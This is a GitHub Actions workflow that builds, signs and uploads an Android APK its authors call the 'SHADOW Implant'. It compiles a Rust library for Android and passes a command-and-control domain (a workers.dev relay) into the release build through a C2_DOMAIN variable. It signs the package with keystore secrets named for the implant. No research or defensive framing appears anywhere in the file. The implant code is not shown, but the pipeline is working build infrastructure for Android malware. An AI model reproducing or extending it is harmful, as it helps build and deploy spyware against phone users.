name: Build SHADOW Implant

on:
  push:
    branches: [ "main" ]
    paths:
      - 'core/**'
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'
          cache: 'gradle'

      - name: Decode Keystore
        run: |
          mkdir -p core/android/app
          echo "${{ secrets.IMPLANT_KEYSTORE_BASE64 }}" | base64 -d > core/android/app/implant.jks

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: aarch64-linux-android, armv7-linux-androideabi, x86_64-linux-android

      - name: Install cargo-ndk
        run: cargo install cargo-ndk

      - name: Setup Android NDK
        id: setup-ndk
        uses: nttld/setup-ndk@v1
        with:
          ndk-version: r26b
          local-cache: false

      - name: Configure Cargo for NDK
        run: |
          mkdir -p .cargo
          cat > .cargo/config.toml << 'EOF'
          [target.aarch64-linux-android]
          ar = "llvm-ar"
          linker = "aarch64-linux-android24-clang"
          
          [target.armv7-linux-androideabi]
          ar = "llvm-ar"
          linker = "armv7a-linux-androideabi24-clang"
          
          [target.x86_64-linux-android]
          ar = "llvm-ar"
          linker = "x86_64-linux-android24-clang"
          
          [build]
          rustflags = ["-C", "link-arg=-Wl,-Bdynamic"]
          EOF
          
          export PATH="${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin:$PATH"
          echo "CC_aarch64_linux_android=${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android24-clang" >> $GITHUB_ENV
          echo "CXX_aarch64_linux_android=${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android24-clang++" >> $GITHUB_ENV
          echo "AR_aarch64_linux_android=${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-ar" >> $GITHUB_ENV
          echo "$PATH" >> $GITHUB_PATH

      - name: Export NDK Path
        run: echo "ANDROID_NDK_HOME=${{ steps.setup-ndk.outputs.ndk-path }}" >> $GITHUB_ENV

      - name: Build Rust Core (libshadow.so)
        run: |
          export PATH="${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/bin:$PATH"
          cd core
          cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
          # Bundle C++ shared runtime (required by Rust stdlib on Android)
          cp "${{ steps.setup-ndk.outputs.ndk-path }}/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/aarch64-linux-android/libc++_shared.so" \
             android/app/src/main/jniLibs/arm64-v8a/
          ls -la android/app/src/main/jniLibs/arm64-v8a/

      - name: Build Android APK
        run: |
          cd core/android
          chmod +x gradlew
          export C2_DOMAIN="cfg-relay.marwan23.workers.dev"
          ./gradlew assembleRelease
        env:
          C2_DOMAIN: cfg-relay.marwan23.workers.dev

      - name: Sign APK
        uses: r0adkll/sign-android-release@v1
        with:
          releaseDirectory: core/android/app/build/outputs/apk/release
          signingKeyBase64: ${{ secrets.IMPLANT_KEYSTORE_BASE64 }}
          alias: ${{ secrets.IMPLANT_KEY_ALIAS }}
          keyStorePassword: ${{ secrets.IMPLANT_KEYSTORE_PASS }}
          keyPassword: ${{ secrets.IMPLANT_KEY_PASS }}
        continue-on-error: true # Will fail gracefully if secrets aren't set yet, leaving unsigned APK

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: shadow-implant-apk
          path: core/android/app/build/outputs/apk/release/*.apk
